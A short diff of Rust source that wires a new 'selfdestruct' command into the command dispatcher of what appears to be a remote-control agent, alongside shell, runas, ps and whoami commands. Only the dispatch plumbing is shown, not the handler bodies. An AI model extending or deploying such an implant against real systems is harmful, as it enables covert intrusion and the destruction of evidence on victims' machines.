@@ -24,6 +24,7 @@ mod sleep;
 mod shutdown;
 mod whoami;
 mod unknown;
+mod selfdestruct;
 
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
@@ -37,6 +38,7 @@ pub enum CommandType {
     Ps,
     Pwd,
     Save,
+    Selfdestruct,
     Runas,
     Shell,
     Shutdown,
@@ -156,6 +158,7 @@ impl NotionCommand {
                 "pwd"      => CommandType::Pwd,
                 "runas"    => CommandType::Runas,
                 "save"     => CommandType::Save,
+                "selfdestruct" => CommandType::Selfdestruct,
                 "shell"    => CommandType::Shell,
                 "shutdown" => CommandType::Shutdown,
                 "sleep"    => CommandType::Sleep,
@@ -182,6 +185,7 @@ impl NotionCommand {
             CommandType::Pwd         => pwd::handle().await,
             CommandType::Runas    => runas::handle(&self.args).await,
             CommandType::Save     => save::handle(&mut self.args, config_options).await,
+            CommandType::Selfdestruct => selfdestruct::handle().await,
             CommandType::Shell    => shell::handle(&mut self.args).await,
             CommandType::Shutdown    => shutdown::handle().await,
             CommandType::Sleep    => sleep::handle(&mut self.args, config_options).await,
